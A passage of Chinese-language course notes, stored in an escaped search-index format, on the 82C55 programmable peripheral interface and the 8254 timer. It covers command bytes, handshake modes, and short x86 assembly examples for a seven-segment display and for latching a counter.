<li>\u63a7\u5236\u5bc4\u5b58\u5668\u5927\u5c0f\u4e3a 8-bit\uff0c\u7b2c\u4e03\u4f4d\u51b3\u5b9a\u4e86\u8be5\u63a7\u5236\u5b57\u4e3a Command Byte A \u8fd8\u662f B\uff0c\u5206\u522b\u7528\u4e8e\u4e0d\u540c\u7684\u529f\u80fd</li> <li>Command Byte A: \u8bbe\u7f6e\u7aef\u53e3 A\u3001B\u3001C \u7684\u63a7\u5236\u4fe1\u53f7</li> <li>Command Byte B: \u8bbe\u7f6e\u7aef\u53e3 C \u7684\u5177\u4f53\u6bd4\u7279\u4f4d </li> </ul> </li> <li>\u53ea\u6709\u4fe1\u53f7 CS=0 \u624d\u80fd\u8bbf\u95ee\u82af\u7247</li> </ul> \u5c06 82C55 \u63a5\u5165 80386SX \u5fae\u5904\u7406\u5668\u7684 Low Bank \u7684\u4e00\u4e2a\u4f8b\u5b50 <ul> <li>\u56e0\u4e3a\u53ea\u63a5\u4e86 Low Bank\uff0c\u6240\u4ee5\u6bcf\u4e2a Port \u76f8\u9694 2-Byte\uff0c\u4f7f\u7528 \\(A_1 A_2\\) \u63a5\u5165\u5230 82C55 \u7684\u9009\u62e9\u4fe1\u53f7 \\(A_1 A_0\\)</li> <li>\u63a5\u5165\u7684 \\(\\overline{CS}\\) \u4fe1\u53f7\u4e3a 0\uff0c\u624d\u542f\u7528 82C55</li> <li>\u8003\u8bd5\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u6279\u5730\u5740\uff0c\u95ee\u4f60\u54ea\u4e9b\u4f4d\u63a5\u5165 \\(\\overline{CS}\\)\uff0c\u54ea\u4e9b\u4f4d\u63a5\u5165 \\(A_1 A_0\\)</li> </ul> <p></p> <p>\\(A_1 A_0=11\\) \u5730\u5740\u7684 Command Register \u65e2\u662f\u63a7\u5236\u5bc4\u5b58\u5668\u53c8\u662f\u72b6\u6001\u5bc4\u5b58\u5668\uff0cBit Position 7 \u51b3\u5b9a\u4e86\u8be5\u5b57\u8282\u5f53\u524d\u5de5\u4f5c\u5728 A \u6a21\u5f0f\u8fd8\u662f B \u6a21\u5f0f\uff1a</p> <ul> <li>\\(D_7 = 1\\)\uff1a\u6a21\u5f0f\u5b9a\u4e49\u6a21\u5f0f\uff08Mode Definition\uff09\uff0c\u7528\u4e8e\u914d\u7f6e A\u3001B\u3001C \u7aef\u53e3\u7684\u5de5\u4f5c\u6a21\u5f0f\u548c\u8f93\u5165/\u8f93\u51fa\u65b9\u5411\u3002<ul> <li>3-6 \u4f4d\u4e3a Group A \u670d\u52a1\uff1b0-2 \u4f4d\u4e3a Group B \u670d\u52a1</li> </ul> </li> <li>\\(D_7 = 0\\)\uff1a\u4f4d\u7f6e\u4f4d/\u590d\u4f4d\u6a21\u5f0f\uff08Bit Set/Reset\uff09\uff0c\u4e13\u95e8\u7528\u4e8e\u5bf9 Port C \u7684\u67d0\u4e00\u4f4d\u8fdb\u884c\u7f6e 1 \u6216\u6e05 0 \u64cd\u4f5c\u3002<ul> <li>Command Byte B \u4e2d 4-6 \u4f4d\u4e3a\u81ea\u7531\u9879\uff0c\u53ef\u4ee5\u968f\u610f\u8bbe\u7f6e</li> <li>\u5728 Mode 1/2 \u4e2d\uff0cPort C \u88ab\u7528\u6765\u505a\u63e1\u624b\u4fe1\u53f7\uff0c\u56e0\u6b64\u53ea\u80fd\u6309\u4f4d\u5199\uff1b\u5728 Mode 0 \u4e2d\u5141\u8bb8\u5bf9 Port C \u6b63\u5b57\u8282\u5199</li> </ul> </li> </ul> <p></p> \u4e09\u79cd\u6a21\u5f0f\u7684\u4ea4\u4e92\u6a21\u5f0f <p></p> <p>Mode=0</p> <p>\u5bf9\u4e8e\u53ea\u9700\u8981\u6570\u636e\u8f93\u51fa\u6216\u8005\u53ea\u9700\u8981\u6570\u636e\u8f93\u5165\u7684\u8bbe\u5907\uff08\u5982\u6295\u5f71\u4eea\uff09\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8fd0\u884c\u5728 Mode 0 \u5373\u53ef\u3002</p> <p>\u6211\u4eec\u4ee5\u70b9\u4eae 8-digit \u4e03\u6bb5\u6570\u7801\u7ba1\u4e3a\u4f8b\uff0c\u4f7f\u7528 Port B \u4f5c\u4e3a 8 \u4e2a\u6570\u5b57\u7684\u4f7f\u80fd\u4e0e\u5237\u65b0\u4fe1\u53f7\uff0c\u4f7f\u7528 Port A \u4f5c\u4e3a\u6bcf\u4e2a\u4e03\u6bb5\u6570\u7801\u7ba1\u7684\u6570\u636e\uff0c\u63a5\u7ebf\u5982\u4e0b\uff1a</p> <p></p> <p>\u89c2\u5bdf\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\uff0cPort A \u548c Port B \u6b64\u65f6\u90fd\u8fd0\u884c\u5728 Mode 0\uff0c\u8f93\u51fa\u6a21\u5f0f\u4e0b\uff0c\u56e0\u6b64\u6211\u4eec\u5bf9 Command Register \u8fdb\u884c\u8bbe\u7f6e\uff1a</p> <pre><code>; programming the 82C55 PIA\nMOV AL, 10000000B    ; command (A) \u6b64\u65f6 Port C \u76f8\u5173\u53ef\u4ee5\u968f\u610f\u8bbe\u7f6e\nMOV DX, 703H         ; address port 703H\nOUT DX, AL           ; send command to port 703H\n</code></pre> <p>\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5faa\u73af\u626b\u63cf 8 \u4e2a\u6570\u5b57\uff0c\u4ee5\u8fbe\u6210\u6240\u6709\u6570\u5b57\u540c\u65f6\u4eae\u7740\u7684\u89c6\u89c9\u6548\u679c\uff1a</p> <pre><code>DISP PROC NEAR USES AX BX DX SI\n\n    PUSHF                   ; \u5728\u5faa\u73af\u79fb\u4f4d\u4e2d\u4f1a\u5f71\u54cd Flag\uff0c\u56e0\u6b64\u8981\u4fdd\u5b58\u6062\u590d\n    MOV   BX, 8             ; \u8ba1\u6570\u5668 Counter\n    MOV   AH, 7FH           ; \u9009\u62e9\u6a21\u5f0f\uff0c7F \u8868\u793a\u7b2c\u4e03\u4e2a LED \u88ab\u9009\u4e2d\n    MOV   SI, OFFSET MEM - 1; Display Data \u7684\u5730\u5740\uff08\u504f\u79fb\uff09\n    MOV   DX, 701H          ; Port B \u7684\u5730\u5740 \n\n; DISPLAY ALL 8 DIGITS\n\n    .REPEAT\n        MOV   AL, AH        ;  \n        OUT   DX, AL        ; \u53d1\u9001\u9009\u62e9\u6a21\u5f0f\u7ed9 Port B\n        DEC   DX            ; Port A \u7684\u5730\u5740\n        MOV   AL, [BX+SI]   ;\n        OUT   DX, AL        ; \u53d1\u9001\u6570\u636e\u7ed9 Port A\n        CALL  DELAY         ; \u5ef6\u8fdf\u7b49\u5f85 1ms\n        ROR   AH, 1         ; \u8c03\u6574\u9009\u62e9\u6a21\u5f0f\n        INC   DX            ; Port B \u7684\u5730\u5740\n        DEC   BX            ; \u8ba1\u6570\u5668-1\n    .UNTIL BX == 0\n\n    POPF                    ; \u6062\u590d Flag\n    RET\n\nDISP ENDP\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u4f7f\u7528 82C55 \u4f5c\u4e3a\u6b65\u8fdb\u7535\u673a\u7684\u9a71\u52a8\u3002\u6b65\u8fdb\u7535\u673a\u901a\u8fc7\u7ebf\u5708\u901a\u7535\u6765\u5438\u5f15 Motor \u65cb\u8f6c\uff0c\u6309\u7167\u6fc0\u52b1\u6a21\u5f0f\uff0c\u6709 full-step, half-step, micro-step \u6216\u8005 one-phase, two-phase \u4e24\u79cd\u5206\u7c7b\u65b9\u5f0f\u3002</p> Full Step \u7c97\u7c92\u5ea6\u65cb\u8f6cHalf Step \u7ec6\u7c92\u5ea6\u65cb\u8f6c <p></p> <p></p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u901a\u8fc7 Port 7 \u6765\u63a7\u5236\u6b65\u8fdb\u7535\u673a\u7684\u7ebf\u5708\u4f7f\u80fd\uff0c\u4f7f\u7528\u4e09\u4e2a\u7ebf\u5708\u6765\u63a7\u5236 Motor \u79fb\u52a8\uff0c\u56e0\u6b64\u53ea\u6709\u4f4e\u4e09\u4f4d\u662f\u5728\u4f7f\u7528\u7684\uff1a</p> <p></p> <p>Mode=1</p> <p>\u6a21\u5f0f 1 \u5f00\u59cb\uff0c\u5916\u90e8\u8bbe\u5907\u4e5f\u5177\u6709\u4e00\u5b9a\u72b6\u6001\uff0c\u9700\u8981\u540c\u6b65\uff0c\u6211\u4eec\u4f7f\u7528 Port C \u4f5c\u4e3a\u63e1\u624b\u4fe1\u53f7\u3002</p> Input OperationOutput Operation <p></p> <ul> <li>\u5bf9\u4e8e Group A\uff0c\u5916\u90e8\u8bbe\u5907\u4e3b\u52a8\u53d1\u9001 \\(\\overline{STB}\\) \u4fe1\u53f7\u5230 PC4 \u4e0a\uff0c\u8fd9\u6837 82C55 \u5c31\u77e5\u9053\u5916\u90e8\u8bbe\u5907\u662f\u5426\u8981\u53d1\u9001\u4fe1\u606f\uff1b82C55 \u901a\u8fc7 PC5 \u53d1\u9001\u4fe1\u53f7 \\(IBF\\) \u6765\u6307\u793a\u5916\u90e8\u8bbe\u5907\u53d1\u9001\u7684\u6570\u636e\u662f\u5426\u5df2\u7ecf\u9501\u5b58\u7ed3\u675f\uff0c\u5982\u679c\u9501\u5b58\u7ed3\u675f\uff0c\u5219\u5916\u90e8\u8bbe\u5907\u53ef\u4ee5\u63a5\u7740\u53bb\u5e72\u81ea\u5df1\u7684\u4e8b\u60c5\u3002</li> <li>\u6570\u636e\u5728 82C55 \u9501\u5b58\u540e\uff0c\u901a\u8fc7 PC3 \u5411 CPU \u53d1\u9001\u4e2d\u65ad\u8bf7\u6c42\u4fe1\u53f7 \\(INTR\\)\uff0cCPU \u6536\u5230\u540e\u53d1\u9001\u8bfb\u4fe1\u53f7 \\(\\overline{RD}\\)\uff0c\u5c06\u6570\u636e\u8bfb\u5165\u3002<ul> <li>82C55 \u5224\u65ad\u6761\u4ef6 \\(\\overline{STB}=1, IBF=1\\) \u6765\u8bbe\u7f6e \\(INTR\\)\uff0c\u5373\u5916\u90e8\u6570\u636e\u5df2\u7ecf\u88ab\u9501\u5b58\u4f4f\uff0c\u4e14\u88ab\u64a4\u6389\u7684\u60c5\u51b5\u4e0b\uff0c\u5411 CPU \u53d1\u9001\u8bf7\u6c42</li> <li>\u4e0a\u56fe\u7684\u4e2d\u65ad\u4f7f\u80fd \\(INTE\\) \u5176\u5b9e\u5c31\u662f PC4/2</li> </ul> </li> </ul> <p>82C55 \u76f8\u5f53\u4e8e\u4e2d\u8f6c\u7ad9\uff0cCPU \u4e0d\u518d\u76f4\u63a5\u5411\u5916\u90e8\u8bbe\u5907\u8bf7\u6c42\u6570\u636e\uff0c\u800c\u662f\u4ece 82C55 \u9501\u5b58\u7684\u6570\u636e\u8bfb\u53d6</p> <p>\u76f8\u6bd4\u4e8e Mode 0\uff0c\u591a\u4e86\u4e2a\u6570\u636e\u9501\u5b58\u7684\u6b65\u9aa4</p> <p>\u6ce8\u610f\u5230 Group A \u4e2d\u7528\u5230\u4e86 PC3\uff0c\u8fd9\u662f\u56e0\u4e3a Mode2 \u4e0b PC6-PC7 \u88ab\u7528\u4e8e\u6570\u636e\u8f93\u51fa\u7684\u63a7\u5236\uff0c\u4e0a C \u53e3\u4e0d\u591f\u7528</p> <p></p> <ul> <li>\u5bf9\u4e8e Group A\uff0cCPU \u4e3b\u52a8\u5411 82C55 \u53d1\u9001 \\(\\overline{WR}\\) \u4fe1\u53f7\uff0c\u8ba9 82C55 \u9501\u5b58 CPU \u6570\u636e\u603b\u7ebf\u4e0a\u7684\u6570\u636e\uff1b82C55 \u5411\u5916\u90e8\u8bbe\u5907\u53d1\u9001 \\(\\overline{OBF}\\) \u6765\u6307\u793a CPU \u6709\u6570\u636e\u8981\u5199\u5165</li> <li>\u5916\u90e8\u8bbe\u5907\u8bfb\u5165\u6570\u636e\u540e\u54cd\u5e94 \\(\\overline{ACK}\\)\uff0c82C55 \u6b64\u65f6\u5411 CPU \u53d1\u9001\u4e2d\u65ad\u4fe1\u53f7 \\(INTR\\)\uff0c\u544a\u77e5 CPU \u53ef\u4ee5\u7ee7\u7eed\u5199\u5165\u5176\u5b83\u6570\u636e</li> </ul> <p>Group B \u4e0d\u4f1a\u5de5\u4f5c\u5728 Mode2\uff0c\u56e0\u6b64\u5b83\u5b8c\u5168\u53ef\u4ee5\u590d\u7528 PC0-PC2 \u4e09\u6761\u4fe1\u53f7\u7ebf</p> <p>\u5f53\u7136\uff0c\u5728\u8f93\u5165\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e0d\u7b49 82C55 \u7ed9 CPU \u53d1\u9001\u4e2d\u65ad\u8bf7\u6c42\uff0c\u800c\u76f4\u63a5\u8ba9 CPU \u8f6e\u8be2 Port C \u7684\u72b6\u6001\u3002\u5bf9\u4e8e Input\uff0c\u5982\u679c\u67e5\u8be2\u5230 \\(IBF\\) \u5df2\u7ecf\u4e3a 1 \u5c31\u53ef\u4ee5\u5f00\u59cb\u8bfb\uff1b\u5bf9\u4e8e Output\uff0c\u5982\u679c\u67e5\u8be2\u5230 \\(\\overline{OBF}\\) \u4e3a 1 \u5c31\u53ef\u4ee5\u5f00\u59cb\u5199\u5165\u65b0\u7684\u6570\u636e\uff08\u5916\u90e8\u8bbe\u5907\u5df2\u7ecf\u53d6\u8d70\u9501\u5b58\u7684\u6570\u636e\uff09\u3002</p> <p>\u4e0b\u56fe\u5c55\u793a\u4e86\u5bf9\u4e8e\u8f93\u5165\u8bbe\u5907 Keyboard \u7684\u8f6e\u8be2\u8fc7\u7a0b\uff0c\u5176\u53cd\u590d\u68c0\u6d4b\u76f4\u5230 Port C \u7684\u7b2c\u4e94\u4f4d\u4e3a 1\uff0c\u624d\u5f00\u59cb\u8bfb\u5165\u9501\u5b58\u7684 ASCII \u6570\u636e\uff1a</p> <p></p> <p>\u5b9e\u9645\u4e0a\uff0cMode 1 \u5141\u8bb8 Group A \u548c Group B \u5206\u522b\u5de5\u4f5c\u5728\u8f93\u5165\u8f93\u51fa\u4e24\u79cd\u4e0d\u540c\u6a21\u5f0f\u4e0b\uff0c\u6b64\u65f6 Command Byte A \u4e2d\u5173\u4e8e Port C \u7684\u63a7\u5236\u53ea\u5f71\u54cd Group A \u4e2d\u6ca1\u6709\u4f7f\u7528\u7684\u4e24\u4e2a\u4f4d\uff1a</p> Group A Output / Group B InputGroup A Input / Group B Output <p></p> <p></p> <p>Mode=2</p> <p>Mode 2 \u652f\u6301 Group A \u5de5\u4f5c\u5728\u53cc\u5de5\u65b9\u5f0f\u4e0b\uff0cPort A \u7684 8 \u4f4d\u5f15\u811a\u65e2\u53ef\u4ee5\u53d1\u9001\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u63a5\u6536\u6570\u636e\uff0c\u4e14\u4e0d\u9700\u8981\u5728\u7a0b\u5e8f\u8fd0\u884c\u4e2d\u9891\u7e41\u66f4\u6539\u6a21\u5f0f\u63a7\u5236\u5b57\u3002</p> <p></p> <p>\u5176\u4e2d PC4-5 \u7528\u4e8e\u8f93\u5165\u63a7\u5236\uff0cPC6-7 \u7528\u4e8e\u8f93\u51fa\u63a7\u5236\uff0cPC3 \u4ecd\u7136\u7528\u4e8e\u4e2d\u65ad\u4fe1\u53f7\uff0cPC0-2 \u4fdd\u7559\u7ed9 Group \u7528\u4e8e Mode 0/1\u3002</p> <p>\u6709\u65f6\u5b58\u5728 Input \u548c Output \u51b2\u7a81\u7684\u60c5\u51b5\u4e0b\uff0c\u5b9e\u9645\u7684\u65f6\u5e8f\u63a7\u5236\u6743\u5728\u5916\u90e8\u8bbe\u5907\u624b\u4e2d\uff1a</p> <ul> <li>\u5916\u8bbe\u63a7\u5236 \\(\\overline{ACK}\\) \u6765\u51b3\u5b9a\u4ec0\u4e48\u65f6\u5019\u8ba9 82C55 \u628a\u8f93\u51fa\u6570\u636e\u201c\u5012\u201d\u51fa\u6765\u3002<ul> <li>\u5f53 \\(\\overline{ACK}\\) \u6709\u6548\u65f6\uff0c\u5916\u8bbe\u6b63\u5728\u8bfb\u53d6\u6570\u636e\uff0c\u6b64\u65f6\u5916\u8bbe\u4e0d\u5e94\u53d1\u9001 \\(\\overline{STB}\\)\u3002</li> </ul> </li> <li>\u5916\u8bbe\u63a7\u5236 \\(\\overline{STB}\\) \u6765\u51b3\u5b9a\u4ec0\u4e48\u65f6\u5019\u628a\u81ea\u5df1\u7684\u8f93\u5165\u6570\u636e\u201c\u585e\u201d\u8fdb\u53bb\u3002<ul> <li>\u5f53 \\(\\overline{STB}\\) \u6709\u6548\u65f6\uff0c\u5916\u8bbe\u6b63\u5728\u53d1\u9001\u6570\u636e\uff0c\u6b64\u65f6\u5916\u8bbe\u7edd\u4e0d\u80fd\u62c9\u4f4e \\(\\overline{ACK}\\)\u3002</li> </ul> </li> </ul> <p>\u6b64\u65f6\u4e00\u4e2a\u53ef\u80fd\u7684\u65f6\u5e8f\u56fe\u5982\u4e0b\uff1a</p> <p></p> \u8f93\u5165\u8f93\u51fa\u5171\u7528\u4e86 PC3 \u4f5c\u4e3a\u4e2d\u65ad\u7ebf\uff0cCPU \u8be5\u5982\u4f55\u5224\u65ad\u8be5\u4e2d\u65ad\u6765\u81ea\u4ec0\u4e48\u4e8b\u4ef6\uff1f <p>\u901a\u8fc7\u8bfb\u53d6 Port C \u6765\u83b7\u77e5\u5f53\u524d\u5230\u5e95\u53d1\u751f\u4e86\u4ec0\u4e48\u3002</p>"},{"location":"Courses/asm/ch11/#8254","title":"8254","text":"<p>Quote</p> <p></p> <p>\u82af\u7247 8254 \u662f\u6807\u51c6\u7684\u5b9a\u65f6\u5668\uff08Timers\uff09\uff0c\u53ea\u6709\u4e00\u4e2a\u6ce2\u5f62\u4fe1\u53f7\u8f93\u51fa\u3002</p> <p>8254 \u5185\u90e8\u96c6\u6210\u4e86 3 \u4e2a\u72ec\u7acb\u7684 16-bit Counter\uff0c\u6bcf\u4e2a Counter \u90fd\u652f\u6301\u7eaf\u4e8c\u8fdb\u5236\u8ba1\u6570\u6216 BCD \u8ba1\u6570\u3002\u65e9\u671f PC \u673a\u4e2d 8254 \u6709\u5982\u4e0b\u56fa\u5b9a\u529f\u80fd\uff1a</p> \u7aef\u53e3\u5730\u5740 \u76ee\u6807\u7ec4\u4ef6 \u529f\u80fd\u63cf\u8ff0 40H Counter 0 \u7cfb\u7edf\u65f6\u949f\u6ef4\u7b54\uff1a\u4ea7\u751f\u7ea6 18.2 Hz \u7684\u4fe1\u53f7\uff0c\u6bcf\u79d2\u89e6\u53d1\u7ea6 18.2 \u6b21\u4e2d\u65ad\uff08IRQ0\uff09\uff0c\u7528\u4e8e\u7ef4\u62a4\u7cfb\u7edf\u65f6\u95f4\u3002 41H Counter 1 DRAM \u5237\u65b0\u8bf7\u6c42\uff1a\u8bbe\u5b9a\u4e3a 15 \\(\\mu\\)s\uff0c\u5468\u671f\u6027\u901a\u77e5 DMA \u63a7\u5236\u5668\u5237\u65b0\u52a8\u6001\u5185\u5b58\uff0c\u9632\u6b62\u6570\u636e\u4e22\u5931\u3002 42H Counter 2 \u626c\u58f0\u5668\u63a7\u5236\uff1a\u8fde\u63a5\u5230 PC \u626c\u58f0\u5668\uff0c\u901a\u8fc7\u6539\u53d8\u9891\u7387\u6765\u4ea7\u751f\u4e0d\u540c\u97f3\u8c03\u7684\u8702\u9e23\u58f0\u3002 43H \u63a7\u5236\u5bc4\u5b58\u5668 \u7528\u4e8e\u8bbe\u5b9a\u4e0a\u8ff0\u4e09\u4e2a\u8ba1\u6570\u5668\u7684\u5de5\u4f5c\u6a21\u5f0f\u548c\u8bfb\u5199\u683c\u5f0f\u3002 <p></p> <p>\u6bcf\u4e2a\u8ba1\u6570\u5668\u90fd\u6709\u5173\u952e\u7684\u4e09\u6761\u5f15\u811a\uff1a</p> <ol> <li>CLK (\u8f93\u5165)\uff1a\u65f6\u949f\u6e90\u3002\u6bcf\u6765\u4e00\u4e2a\u8109\u51b2\uff0c\u8ba1\u6570\u5668\u51cf 1\u3002</li> <li>GATE (\u8f93\u5165)\uff1a\u95e8\u63a7\u4fe1\u53f7\u3002\u7528\u4e8e\u63a7\u5236\u8ba1\u6570\u7684\u5f00\u59cb\u3001\u6682\u505c\u6216\u91cd\u7f6e\uff08\u7c7b\u4f3c\u4e8e\u79d2\u8868\u7684\u5f00\u59cb\u952e\uff09\u3002\u95e8\u63a7\u4fe1\u53f7\u4e3a 0 \u4ee3\u8868\u505c\u6b62\u8ba1\u6570\uff1b\u95e8\u63a7\u4fe1\u53f7\u4e0a\u5347\u6cbf\u4ee3\u8868\u8ba1\u6570\u5f00\u59cb</li> <li>OUT (\u8f93\u51fa)\uff1a\u7ed3\u679c\u4fe1\u53f7\u3002\u5f53\u8ba1\u6570\u51cf\u5230 0\uff08\u6216\u8fbe\u5230\u7279\u5b9a\u6761\u4ef6\uff09\u65f6\uff0cOUT \u5f15\u811a\u4f1a\u6539\u53d8\u7535\u5e73\uff0c\u89e6\u53d1\u4e2d\u65ad\u6216\u9a71\u52a8\u5916\u8bbe\u3002</li> </ol> <p>\u5355\u4e2a\u8ba1\u6570\u5668\u7684\u5185\u90e8\u7ed3\u6784\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u4e0a\u56fe\u9664\u4e86\u5de6\u4e0a\u89d2\u6807\u7eff\u7684\u63a7\u5236\u5bc4\u5b58\u5668\uff0c\u5176\u5b83\u90fd\u662f\u4e09\u4e2a\u8ba1\u6570\u5668\u72ec\u6709\u7684\u8d44\u6e90</p> <ul> <li>\u6bcf\u4e2a\u8ba1\u6570\u5668\u4e2d\u90fd\u6709\u5355\u72ec\u7684\u63a7\u5236\u903b\u8f91\uff0c\u6709\u5355\u72ec\u7684\u72b6\u6001\u5bc4\u5b58\u5668\u4ee5\u53ca\u72b6\u6001\u9501\u5b58\u5668<ul> <li>\u8fd9\u5141\u8bb8\u6211\u4eec\u5148\u6279\u91cf\u8bbe\u63a7\u5236\u5b57\uff0c\u518d\u6279\u91cf\u8d4b\u521d\u503c</li> </ul> </li> <li>8254 \u53ea\u80fd\u63a5\u6536 8-bit \u6570\u636e\uff0c\u56e0\u6b64 Counter \u5185\u90e8\u8ba1\u6570\u8981\u4f7f\u7528 16-bit \u5355\u5143\uff0c\u5219\u9700\u8981\u989d\u5916\u4f7f\u7528\u4e24\u4e2a 8-bit \u7684 Count-Registers \u6765\u8fdb\u884c\u6570\u636e\u8bfb\u5165\u4ee5\u53ca\u4e24\u4e2a 8-bit \u7684 Output Latches \u6765\u8fdb\u884c\u6570\u636e\u8f93\u51fa<ul> <li>\u4e24\u4e2a CR \u88c5\u8f7d\u5230 CE \u4e2d\u53ea\u4f1a\u53d1\u751f\u5728\u65f6\u949f\u4fe1\u53f7 CLK \u7684\u4e0b\u964d\u6cbf</li> <li>CE \u81ea\u51cf\u8fd9\u4e00\u4e8b\u4ef6\u4e5f\u53ea\u4f1a\u53d1\u751f\u5728\u59cb\u7ec8\u4fe1\u53f7 CLK \u7684\u4e0b\u964d\u6cbf</li> </ul> </li> </ul> <p>\u6211\u4eec\u901a\u8fc7\u4fee\u6539 Control Word Register \u6765\u5bf9\u4e09\u4e2a\u8ba1\u6570\u5668\u8fdb\u884c\u7f16\u7a0b\u63a7\u5236\uff0c\u6bcf\u8bbe\u7f6e\u4e00\u4e2a Counter \u90fd\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e\u63a7\u5236\u5b57\u3002</p> <p></p> <p><code>Read/Write</code> \u4f4d\u7528\u6765\u89e3\u51b3\u201c\u5982\u4f55\u7528 8 \u4f4d\u603b\u7ebf\u8bfb\u5199 16 \u4f4d\u6570\u636e\u201d\u7684\u95ee\u9898\uff0c\u56db\u79cd\u7ec4\u5408\u4e0d\u540c\u7684\u529f\u80fd\u5982\u4e0b\uff1a</p> RW1 RW0 \u529f\u80fd\u8bf4\u660e \u52a8\u4f5c\u63cf\u8ff0 \u7528\u5904 0 0 Counter Latch (\u9501\u5b58\u547d\u4ee4) \u5c06\u5f53\u524d\u8ba1\u6570\u5668\u7684\u503c\u201c\u9501\u201d\u5728\u8f93\u51fa\u7f13\u51b2\u5668\u4e2d\uff0c\u65b9\u4fbf CPU \u8bfb\u53d6\uff0c\u4e14\u4e0d\u505c\u6b62\u8ba1\u6570\u3002 \u8ba1\u6570\u5668\u8fd0\u884c\u5728\u9ad8\u901f\u51cf\u6cd5\u4e2d\uff0c\u76f4\u63a5\u8bfb\u53d6\u5f53\u524d\u8ba1\u6570\u503c\uff0c\u53ef\u80fd\u51fa\u73b0\u8bfb\u5b8c\u4f4e\u4f4d\u51c6\u5907\u8bfb\u9ad8\u4f4d\u65f6\uff0c\u9ad8\u4f4d\u5df2\u7ecf\u53d1\u751f\u4e86\u501f\u4f4d\uff1b\u56e0\u6b64 RW=00 \u4f1a\u4e3a\u5f53\u524d\u503c\u4fdd\u5b58\u4e00\u4e2a\u5feb\u7167\u5230 Latch \u4e2d\u4f9b\u8bfb\u53d6 0 1 Read/Write Least Significant Byte (LSB) \u53ea\u8bfb/\u5199 16 \u4f4d\u8ba1\u6570\u5668\u7684 \u4f4e 8 \u4f4d (\\(D_7-D_0\\))\u3002 \u9002\u7528\u4e8e\u53ea\u9700\u8981\u5f88\u5c0f\u8ba1\u6570\u503c\u7684\u5e94\u7528\u573a\u666f\uff1b\u53ea\u64cd\u4f5c\u5355\u5b57\u8282\u53ef\u4ee5\u51cf\u5c11\u4e00\u6761 <code>OUT</code> \u6307\u4ee4 1 0 Read/Write Most Significant Byte (MSB) \u53ea\u8bfb/\u5199 16 \u4f4d\u8ba1\u6570\u5668\u7684 \u9ad8 8 \u4f4d (\\(D_{15}-D_8\\))\u3002 \u9002\u7528\u4e8e\u7cbe\u5ea6\u8981\u6c42\u4e0d\u9ad8\u7684\u5e94\u7528\u573a\u666f\uff1b\u53ea\u64cd\u4f5c\u5355\u5b57\u8282\u53ef\u4ee5\u51cf\u5c11\u4e00\u6761 <code>OUT</code> \u6307\u4ee4 1 1 Read/Write LSB followed by MSB \u6700\u5e38\u7528\u6a21\u5f0f\u3002\u5148\u8bfb/\u5199\u4f4e 8 \u4f4d\uff0c\u7d27\u63a5\u7740\u8bfb/\u5199\u9ad8 8 \u4f4d\u3002 \u8fde\u7eed\u4e24\u4e2a <code>OUT</code> \u6307\u4ee4\uff0c\u81ea\u52a8\u62fc\u6210 16 \u4f4d <p>\u5148\u5199\u63a7\u5236\u5b57\uff0c\u518d\u4e3a\u8ba1\u6570\u5668\u8d4b\u521d\u503c\uff1b\u5199\u521d\u503c\u65f6\u8981\u6ee1\u8db3\u63a7\u5236\u5b57\u4e2d\u7684\u7ea6\u675f</p> <p>\u9501\u5b58\u547d\u4ee4\u7684\u5177\u4f53\u6c47\u7f16\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <pre><code>MOV   AL, 10000000B  ; Counter 2 \u9501\u5b58 \nOUT   43H, AL        ; \u8bbe\u7f6e\u63a7\u5236\u5b57\nIN    AL, 42H        ; \u8bfb\u53d6 Counter 2 LSB\nMOV   AH, AL         ; \u6682\u5b58\u5230 AH\nIN    AL, 42H        ; \u8bfb\u53d6 Counter 2 MSB\nXCHAG AH, AL         ; \u6062\u590d Byte Order\n</code></pre> <p>\u5177\u4f53\u7684\u8bfb\u53d6\u987a\u5e8f\u89c6\u521d\u59cb\u5316\u987a\u5e8f\u800c\u5b9a\uff0c\u5982\u679c\u53ea\u521d\u59cb\u5316\u4e86 MSB\uff0c\u90a3\u4e48\u53ea\u80fd\u8bfb 1B\uff0c\u4e14\u8fd4\u56de MSB</p> <p><code>SC=11</code> \u8868\u793a\u8be5\u63a7\u5236\u5b57\u662f\u4e00\u4e2a\u56de\u8bfb\u547d\u4ee4\uff0c\u5176\u7528\u6765\u6279\u91cf\u9501\u5b58 Counter \u4ee5\u53ca\u5176\u72b6\u6001\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u683c\u5f0f\u5982\u4e0b\uff1a</p> <p></p> <p>\u5982\u679c\u4e00\u4e2a Counter \u7684\u8ba1\u6570\u5668\u548c\u72b6\u6001\u90fd\u88ab\u9501\u5b58\uff0c\u6b64\u65f6\u8bfb\u53d6\u8be5\u7aef\u53e3\u65f6\u5148\u8fd4\u56de Latched Status\uff0c\u518d\u8fd4\u56de 1-2 Byte \u7684 Latch Count\u3002</p> <p>\u72b6\u6001\u5bc4\u5b58\u5668\u7684\u5404\u4e2a\u4f4d\u5982\u4e0b\uff1a</p> <pre><code># Status Register\n\n    D7         D6       D5    D4    D3   D2   D1   D0\n+--------+------------+-----+-----+----+----+----+-----+\n| Output | Null Count | RW1 | RW0 | M2 | M1 | M0 | BCD | \n+--------+------------+-----+-----+----+----+----+-----+\n</code></pre> <ul> <li>\\(D_7\\) \u4e3a\u63a5\u53e3 <code>OUT</code> \u7684\u503c</li> <li>\\(D_6\\) \u5982\u679c\u4e3a 1\uff0c\u5219\u8be5\u8ba1\u6570\u5668\u672a\u521d\u59cb\u5316\u5b8c\u5168\uff08\u4f8b\u5982\u672a\u8d4b\u521d\u503c\uff09\uff1b\u5982\u679c\u4e3a 0\uff0c\u5219\u8bf4\u660e\u5141\u8bb8\u88ab\u8bfb\u53d6</li> <li>\\(D_5 - D_0\\) \u4e3a\u8ba1\u6570\u5668\u7684\u7f16\u7a0b\u6a21\u5f0f</li> </ul> <p>\u8ba1\u6570\u5668\u91c7\u7528\u51cf\u6cd5\u8ba1\u6570\uff0c\u56e0\u6b64\u5982\u679c Initial Count \u8d4b\u503c\u4e3a 